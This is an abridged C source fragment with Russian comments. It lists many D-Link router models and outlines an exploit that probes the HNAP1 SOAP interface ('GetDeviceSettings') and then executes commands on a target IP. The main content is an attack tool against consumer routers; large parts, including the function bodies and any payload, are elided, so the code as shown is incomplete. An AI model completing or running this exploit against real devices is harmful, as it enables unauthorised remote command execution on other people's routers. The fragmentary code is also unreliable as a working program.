// "D-Link DIR-645", D-Link AP-1522 revB, D-Link DAP-1650 revB, D-Link DIR-880L, D-Link DIR-865L, D-Link DIR-860L revA, D-Link DIR-860L revB, D-Link DIR-815 revB, D-Link DIR-300 revB, D-Link DIR-600 revB, D-Link DIR-645, D-Link TEW-751DR, D-Link TEW-733GR
...
// Функция для отправки HTTP-запроса и проверки уязвимости
int http_request(const char *target_ip, int port, const char *soap_action) {
    int sock;
...
void execute_command(const char *target_ip, int port, const char *cmd) {
    ...
    if (http_request(target_ip, port, soap_action) == 1) {
...
int main(int argc, char *argv[]) {
    ...
    // Проверка уязвимости
    if (http_request(target_ip, target_port, "\"http://purenetworks.com/HNAP1/GetDeviceSettings\"") == 1) {
